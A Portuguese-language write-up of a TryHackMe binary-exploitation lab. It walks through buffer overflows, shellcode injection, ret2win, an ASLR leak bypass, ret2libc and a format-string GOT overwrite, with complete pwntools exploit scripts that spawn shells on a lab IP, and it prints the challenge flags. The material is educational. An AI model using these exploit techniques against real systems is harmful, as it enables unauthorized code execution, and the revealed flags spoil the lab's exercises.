# Trypwnmeone

## Desafio: TryOverlfowMe 1 (Exploração Binária)

### Introdução:

No primeiro desafio, enfrentamos uma vulnerabilidade clássica de buffer overflow, onde precisamos apenas sobrescrever o valor da variável admin.

### Análise inicial:

O programa recebe uma entrada do usuário através da função insegura gets(). Se a variável admin for definida como 1 (provavelmente através de um buffer overflow), ele abre e imprime o conteúdo de flag.txt; caso contrário, ele encerra.

A vulnerabilidade existe devido ao uso da função gets(), que não realiza verificação de limites (bounds checking). Isso nos permite executar um buffer overflow, sobrescrever o conteúdo da variável admin e ler a flag.

```bash
int main(){
    setup();
    banner();
    int admin = 0;
    char buf[0x10]; // Buffer de 16 bytes

    puts("PLease go ahead and leave a comment :");
    gets(buf); // Função vulnerável

    if (admin){ // Objetivo: sobrescrever para 1
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        char ch;
        while ((ch = fgetc(file)) != EOF) {
            putchar(ch);
    }
    fclose(file);
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

O próximo passo é executar o overflowme1 para observar seu comportamento. Ao fornecer um comentário que excede o buffer, conseguimos causar uma falha de segmentação (segmentation fault).

### Solução:

Com o script Pwntools a seguir, conseguimos nos conectar à máquina alvo do desafio.

Ele cria um payload com 16 bytes de preenchimento (padding) seguidos por 32 repetições do valor 1 (empacotado em 32 bits com p32(1)), com o objetivo de sobrescrever a variável admin.

Por fim, ele envia o payload e entra em modo interativo para receber a saída do servidor.

```bash
from pwn import *

# IP e porta do alvo
target_ip = '10.10.23.250'
target_port = 9003

# Conecta ao servidor remoto
p = remote(target_ip, target_port)

# Monta o payload
padding = b'A' * 16   # 16 bytes para preencher o buffer
admin_value = p32(1) * 32  # Valor para sobrescrever 'admin'

payload = padding + admin_value 

# Envia o payload
p.sendline(payload)

# Interage com o programa para ver o resultado (a flag)
p.interactive()
```

Após executarmos nosso script, recebemos a flag do primeiro desafio.

`THM{Oooooooooooooovvvvverrrflloowwwwww}`

## Desafio: TryOverflowMe 2 (Exploração Binária)

### Introdução:

No segundo desafio, também enfrentamos uma vulnerabilidade clássica de buffer overflow. O objetivo é, novamente, sobrescrever o valor da variável admin, mas desta vez com um valor hexadecimal específico.

### Análise inicial:

Assim como no desafio anterior, o programa recebe uma entrada do usuário. Ele verifica se um valor específico (0x59595959) está definido na variável admin e, em caso afirmativo, lê e imprime o conteúdo de flag.txt. Caso contrário, ele encerra.

Desta vez, o buffer é um pouco maior (64 bytes) e o valor para o qual a variável admin deve ser alterada é 0x59595959.

```bash
int read_flag(){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        if(!file){
            puts("the file flag.txt is not in the current directory, please contact support\n");
            exit(1);
        }
        char ch;
        while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }
    fclose(file);
}

int main(){
    
    setup();
    banner();
    int admin = 0;
    int guess = 1;
    int check = 0;
    char buf[64]; // Buffer de 64 bytes

    puts("Please Go ahead and leave a comment :");
    gets(buf); // Função vulnerável

    if (admin==0x59595959){ // Objetivo: sobrescrever para este valor
            read_flag();
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

Ao executarmos o overflowme2 para testar, confirmamos que, ao fornecer um comentário maior que o buffer, causamos uma falha de segmentação (segmentation fault).

### Solução:
Com o script Pwntools a seguir, conseguimos nos conectar à máquina alvo do desafio.

Ele cria um payload que consiste em 64 bytes A (padding) para estourar o buffer, seguido pelo valor 0x59595959 (empacotado com p32) repetido várias vezes para garantir a sobrescrita da variável admin.

Após enviar o payload, o script entra em modo interativo para exibir a flag retornada pelo servidor.

```bash
from pwn import *

# IP e porta do alvo
target_ip = '10.10.23.250'
target_port = 9004

# Conecta ao servidor remoto
p = remote(target_ip, target_port)

# Monta o payload
padding = b'A' * 64        # 64 bytes para preencher o buffer
admin_value = p32(0x59595959) * 32 # Valor específico necessário

payload = padding + admin_value 

# Envia o payload
p.sendline(payload)

# Interage com o programa para ver o resultado (a flag)
p.interactive()
```
Após executarmos nosso script, recebemos a flag do segundo desafio.

`THM{why_just_the_A_have_all_theFun?}`

## Desafio: TryExecMe (Exploração Binária)

### Introdução:
Este desafio não exige um overflow para explorar a vulnerabilidade. Este tipo de exploração binária envolve a injeção de shellcode.

### Análise inicial:
O programa deste desafio lê a entrada do usuário para um buffer e, em seguida, tenta executá-la como se fosse uma função. Ao fornecer um shellcode válido, conseguimos obter uma shell.

A vulnerabilidade reside na seguinte linha, pois ela aceita diretamente a entrada do usuário e tenta executá-la como código:

```bash
( ( void (*) () ) buf) ();
'''

'''bash
int main(){
    setup();
    banner();
    char *buf[128];   

    puts("\nGive me your shell, and I will execute it: ");
    read(0,buf,sizeof(buf)); // Lê a entrada para o buffer
    puts("\nExecuting Spell...\n");

    ( ( void (*) () ) buf) (); // Executa o conteúdo do buffer

}
```
O próximo passo é executar o tryexecme para observar seu comportamento. O programa solicita que forneçamos nossa "shell" e diz que irá executá-la.

### Solução
Usamos o script Pwntools a seguir para resolver o desafio. Precisamos definir o contexto da arquitetura para amd64 (para a geração correta do shellcode) e, em seguida, conectar à máquina alvo.

O script cria um shellcode que gera uma shell (shellcraft.sh()) e o envia como payload. Finalmente, mudamos para o modo interativo para interagir com a shell que recebemos.

```bash
from pwn import *

# Configura o contexto do pwntools para o binário
context.arch = 'amd64'  # Baseado na arquitetura do seu binário

# Conecta ao serviço remoto
p = remote('10.10.23.250', 9005)

# Cria o shellcode (para gerar uma shell)
shellcode = asm(shellcraft.sh())
payload = shellcode 

# Envia o payload para o serviço remoto
p.sendline(payload)

# Interage com a shell
p.interactive()
```
Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do terceiro desafio.

`THM{a_r3t_to_w1n_by_thm}`

##Desafio: TryRetMe (Exploração Binária)

### Introdução:
No quarto desafio, enfrentamos uma vulnerabilidade do tipo ret2win. Um ret2win (Return-to-Win) é um tipo de binário onde existe uma função win() (ou equivalente) que não é chamada, e nosso objetivo é redirecionar a execução do programa para ela.

### Análise inicial:
O programa exibe a mensagem "Return to where? : " e lê até 512 bytes de entrada. Após ler a entrada, ele imprime "ok, let's go!" e termina.

A função win(), que executaria system("/bin/sh") e nos daria uma shell, é definida no código, mas nunca é invocada no fluxo de execução normal.

```bash
int win(){

    system("/bin/sh");
}

void vuln(){
    char *buf[0x20]; // Buffer de 32 bytes (ponteiros de 64-bit)
    puts("Return to where? : ");
    read(0, buf, 0x200); // Lê 512 bytes para um buffer menor
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    vuln();
}
```
Nosso objetivo é usar o buffer overflow na função vuln() para sobrescrever o endereço de retorno na stack (controlando o registrador $rsp) e substituí-lo pelo endereço da função win().

Para isso, precisamos de duas informações:

1. O offset (quantos bytes) até o endereço de retorno.
2. O endereço da função win().

Para determinar o offset, usamos o GDB com GEF:

1. Geramos um padrão cíclico (cyclic pattern).
2. Executamos o programa no GDB (run).
3. Colamos o padrão como entrada, o que causa um overflow e uma falha de segmentação.

Ao inspecionar o registrador $rsp no momento da falha, o GEF nos mostra que o offset é de 264 bytes. Isso significa que, após 264 bytes de preenchimento, podemos escrever o endereço para onde queremos que a execução retorne.

### Solução:
Como mencionado no desafio, o sistema (Ubuntu) pode ter problemas de alinhamento de pilha (stack alignment issues). Para resolver isso, adicionamos um ret gadget ao nosso payload. Este gadget é simplesmente uma instrução ret que colocamos na pilha logo antes do endereço da função win(). Isso garante que a pilha esteja corretamente alinhada quando win() for chamada.

O script Pwntools a seguir é usado para explorar a vulnerabilidade. Ele monta um payload que consiste em:

1. Padding: 264 bytes de lixo (b'A').
2. ret gadget: O endereço de uma instrução ret (encontrada pelo Pwntools).
3. Endereço win: O endereço da função win (obtido dos símbolos do ELF).

```bash
from pwn import *

# Define o contexto do binário
elf = context.binary = ELF('./tryretme')

# Conecta ao servidor remoto
p = remote('10.10.23.250', 9006)

# Endereço da função win
win_addr = elf.symbols['win']

# Endereço de um gadget `ret` (para corrigir alinhamento da pilha)
# O Pwntools encontra isso automaticamente
ret_gadget = ROP(elf).find_gadget(['ret'])[0]

# Offset (determinado com o padrão cíclico)
offset = 264

# Payload: preenchimento + gadget ret + endereço da win
payload = b'A' * offset
payload += p64(ret_gadget)  # Adiciona o gadget ret para alinhar
payload += p64(win_addr)   # O endereço de retorno que queremos

# Envia o payload após receber a pergunta
p.sendlineafter('Return to where? : ', payload)

# Interage com a shell
p.interactive()
```
Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do quarto desafio.

`THM{a_r3t_to_w1n_by_thm}`

## Desafio: Random Memories (Exploração Binária)

###Introdução:
Esta é uma continuação da vulnerabilidade ret2win anterior. No entanto, desta vez estamos lidando com ASLR (Address Space Layout Randomization). Novamente, temos uma função win() cujo endereço queremos sobrescrever no registrador $rsp.

O ASLR é uma técnica de segurança que randomiza os endereços de memória, tornando mais difícil para um atacante prever a localização de funções críticas. Este mecanismo pode ser contornado (bypassed) se recebermos endereços vazados (leaked addresses), pois podemos determinar o offset relativo ao endereço base a partir desse vazamento.

### Análise inicial:
O programa exibe o endereço da função vuln() (o "vazamento"), em seguida, solicita uma entrada. Ele lê 512 bytes para um buffer de apenas 32 bytes, causando um buffer overflow. A função win() não é chamada diretamente.

```bash
int win(){
    system("/bin/sh\0");
}

void vuln(){
    char *buf[0x20]; // Buffer de 32 bytes
    printf("I can give you a secret %llx\n", &vuln); // O LEAK
    puts("Where are we going? : ");
    read(0, buf, 0x200); // Lê 512 bytes
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    banner();
    vuln();
}
```
Ao executar o random, ele nos dá o "segredo": o endereço da função vuln(), que muda a cada execução por causa do ASLR.

Como no desafio anterior, precisamos do offset para o $rsp. Usando GDB e um padrão cíclico (cyclic pattern), determinamos que o offset é, novamente, 264 bytes.

Em seguida, precisamos dos offsets (distância do início do binário) das funções vuln e win. Podemos encontrá-los facilmente com o objdump:

```bash
objdump -d ./random | grep vuln
objdump -d ./random | grep win
```

Ao contrário do desafio anterior (onde o endereço de win era estático), agora precisamos calcular o endereço real de win em tempo de execução. O endereço base é o endereço inicial onde o código do binário é carregado na memória.

A fórmula para contornar o ASLR é:

1. Endereço_Base = Endereço_Vazado_vuln - Offset_vuln
2. Endereço_Real_win = Endereço_Base + Offset_win

### Solução 
Com nosso script Pwntools, nós:

1. Recebemos o endereço vazado da vuln().
2. Calculamos o endereço base do binário (usando os offsets encontrados com o objdump).
3. Calculamos o endereço real da win() e do ret gadget (necessário para alinhamento da pilha).
4. Montamos o payload: 264 bytes de lixo + ret gadget + endereço da win().
5. Enviamos o payload e obtemos a shell.

<!-- end list -->

```bash
from pwn import *

# Inicia o processo
#p = process('./random')
p = remote('10.10.23.250', 9007)

# 1. Recebe o leak do endereço da 'vuln'
p.recvuntil(b"I can give you a secret ")
leaked_vuln_addr = int(p.recvline().strip(), 16)
log.info(f"Endereço 'vuln' vazado: {hex(leaked_vuln_addr)}")

# Offsets obtidos com objdump
vuln_offset = 0x1319  # Offset da vuln
win_offset = 0x1210   # Offset da win

# 2. Calcula o endereço base do binário
base_address = leaked_vuln_addr - vuln_offset
log.info(f"Endereço base: {hex(base_address)}")

# 3. Calcula os endereços reais
win_address = base_address + win_offset
log.success(f"Endereço da 'win': {hex(win_address)}")

# Calcula o endereço do gadget 'ret' (para alinhamento da pilha)
ret_offset = 0x101a  # Offset do 'ret' (encontrado com objdump/ROPgadget)
ret_gadget = base_address + ret_offset
log.success(f"Endereço do 'ret' gadget: {hex(ret_gadget)}")

# 4. Cria o payload
payload = b"A" * 264          # Padding até o RSP
payload += p64(ret_gadget)    # Gadget 'ret' para alinhar a pilha
payload += p64(win_address)   # Sobrescreve end. de retorno com 'win'

# Loga o payload
log.info(f"Payload: {payload}")

# 5. Envia o payload
p.sendline(payload)

# Interage com a shell
p.interactive()
```
Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do desafio.

`THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}`

## Desafio: The librarian (Exploração Binária)

### Introdução:
Este desafio é uma exploração binária ret2libc que requer múltiplos estágios. O processo é dividido em duas partes principais:

1. Estágio 1 (Leak de Endereço): Usamos a técnica ret2plt para vazar um endereço da libc. Fazemos isso chamando a função puts através da PLT (Procedure Linkage Table) e passando como argumento o seu próprio endereço na GOT (Global Offset Table). Isso faz com que o programa imprima o endereço real da puts na memória.

2. Estágio 2 (Exploit): Com o endereço vazado, calculamos o endereço base da libc. Com isso, podemos encontrar o endereço de qualquer função (como system) e de strings (como "/bin/sh"). Em seguida, enviamos um segundo payload ret2libc para chamar system("/bin/sh") e obter uma shell.

### Análise inicial:
Primeiro, executamos a aplicação no GDB. Criamos um padrão cíclico (cyclic pattern) de tamanho suficiente e o passamos para o programa.
Após o crash, determinamos que o offset para sobrescrever o endereço de retorno (e controlar o $rsp) é de 264 bytes.
O primeiro payload é cuidadosamente montado para vazar o endereço e, crucialmente, retornar à função main para que possamos enviar o segundo payload:

• padding = b"A" * 264: Preenche o buffer até o endereço de retorno.
• payload += p64(rop.find_gadget(['ret'])[0]): Adiciona um gadget ret para garantir o alinhamento da pilha.
• payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]): Gadget pop rdi; ret para carregar nosso argumento (o endereço da puts@got) no registrador RDI.
• payload += p64(binary.got.puts): O endereço de puts na GOT, que será passado como argumento para a própria puts.
• payload += p64(binary.plt.puts): Chama a puts através da PLT, que imprimirá o endereço que está na GOT.
• payload += p64(binary.symbols.main): Retorna à função main, permitindo-nos enviar um segundo payload.

Ao rodar o script parcial (primeiro estágio), vemos que o ASLR está ativo e os endereços mudam a cada execução.

### Solução:
O script final combina as duas etapas. Ele envia o primeiro payload, recebe o leak da puts, e então calcula o endereço base da libc.

A linha libc.address = leak - libc.symbols.puts calcula o endereço base da libc subtraindo o offset conhecido da puts (encontrado no arquivo libc.so.6) do endereço que vazamos em tempo de execução. Isso nos permite contornar o ASLR.

Com o endereço base, calculamos os endereços de system e da string "/bin/sh" (cujos offsets foram encontrados previamente) e enviamos o segundo payload para obter a shell.

```bash
from pwn import * binary_file = './thelibrarian'
libc = ELF('./libc.so.6')

# Conecta ao alvo remoto
p = remote('10.10.23.250', 9008)
#p = process(binary_file) # Para testes locais

context.binary = binary = ELF(binary_file, checksec=False)
rop = ROP(binary)

# --- Estágio 1: Vazar o endereço da 'puts' ---

padding = b"A" * 264
payload = padding
payload += p64(rop.find_gadget(['ret'])[0]) # Gadget 'ret' para alinhamento
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # pop rdi; ret
payload += p64(binary.got.puts) # Argumento para puts (seu próprio endereço na GOT)
payload += p64(binary.plt.puts) # Chamar puts@plt
payload += p64(binary.symbols.main) # Retornar para main

p.recvuntil(b"Again? Where this time? : \n")
p.sendline(payload)
p.recvuntil(b"ok, let's go!\n\n")

# Ler o endereço vazado
leak = u64(p.recvline().strip().ljust(8, b'\0'))
log.info(f'Puts leak => {hex(leak)}')

# Calcular o endereço base da libc
libc.address = leak - libc.symbols.puts
log.info(f'Libc base => {hex(libc.address)}')

# Offsets manuais (podem ser encontrados com 'readelf -s libc.so.6 | grep system' e 'strings -ax -t x libc.so.6 | grep /bin/sh')
bin_sh_offset = 0x1b3d88
system_offset = 0x4f420

# Calcular endereços reais
bin_sh = libc.address + bin_sh_offset
system = libc.address + system_offset

log.info(f'/bin/sh address => {hex(bin_sh)}')
log.info(f'system address => {hex(system)}')

# --- Estágio 2: Chamar system("/bin/sh") ---

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # pop rdi; ret
payload += p64(bin_sh)            # Argumento RDI: endereço de "/bin/sh"
payload += p64(system)            # Chamar system()
payload += p64(rop.find_gadget(['ret'])[0]) # 'ret' para alinhamento (opcional, boa prática)
payload += p64(0x0) 

p.recvuntil(b"Again? Where this time? : \n")
p.sendline(payload)
p.recvuntil(b"ok, let's go!\n\n")

# Interagir com a shell
p.interactive()
```
Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do sexto desafio.

## Desafio: Not Specified (Exploração Binária)

### Introdução

Neste desafio, estamos lidando com uma vulnerabilidade de Format String. Isso nos lembrou do desafio format string2 do picoCTF, mas aqui não temos nenhuma variável óbvia na stack para sobrescrever com nosso conteúdo.

### Análise inicial:
O programa pede um nome de usuário (username) e o imprime usando printf sem qualquer proteção de formatação, tornando-o vulnerável a um ataque de format string.

Além disso, o código-fonte revela uma função win() que contém uma chamada para system("/bin/sh"). Se conseguirmos explorar a falha para executar essa função, obteremos uma shell.

```bash
int win(){
    system("/bin/sh\0");
}

int main(){
    setup();
    banner();
    char *username[32];
    puts("Please provide your username\n");
    read(0,username,sizeof(username)); // Recebe a entrada
    puts("Thanks! ");
    printf(username); // VULNERABILIDADE: printf direto da entrada
    puts("\nbye\n");
    exit(1);    
}
```

Ao executar o notspecified, ele se comporta como esperado: após inserir um nome de usuário, ele é impresso na tela.

A vulnerabilidade printf(username) permite que um usuário forneça especificadores de formato (como %s, %x, %n), o que pode levar a leituras ou escritas arbitrárias na memória.

Primeiro, vamos descobrir onde nossa entrada está na pilha (o "offset"). Usamos o seguinte comando para vazar a pilha:

```bash
python -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,40)]))" | ./notspecified | grep 4847
```

Vemos, na sexta posição, o conteúdo da nossa entrada (o 4847... é o hexadecimal para HG... da nossa string ABCDEFGH). Isso significa que nosso offset é 6.

### Solução 
Como podemos não apenas ler, mas também escrever na memória (usando %n), podemos alterar o fluxo do programa.

A estratégia será usar a vulnerabilidade de format string para sobrescrever a entrada da GOT (Global Offset Table) da função exit() com o endereço da função win().

O programa termina com uma chamada a exit(1). Ao sequestrar o ponteiro de exit@got, faremos com que o programa, ao tentar sair, execute a função win() e nos dê a shell.

Embora isso possa ser feito manualmente (o que pode ser complicado devido ao alinhamento da pilha no Ubuntu), podemos usar a função fmtstr_payload do Pwntools para automatizar a criação do payload.

```bash
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

# Configura o contexto da arquitetura
context.clear(arch = 'amd64', endian ='little')

# Função wrapper para enviar o payload
def send_payload(payload):
        s.recvline()
        s.sendline(payload)
        r = s.recvline()
        return r

elf = ELF('./notspecified')

# Pega os endereços que precisamos
exit_got = elf.got['exit'] # O endereço que queremos sobrescrever
win_func = elf.symbols['win'] # O endereço que queremos escrever

# Conexão
#s = process('./notspecified') # Teste local
s = remote('10.10.23.250', 9009) # Alvo

# Gera o payload: "Escreva 'win_func' no endereço 'exit_got', usando o offset 6"
payload = fmtstr_payload(6, {exit_got: win_func})

print(payload)
print(send_payload(payload))

# Recebe a shell
s.interactive()
```
Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do sétimo desafio.

` THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}`
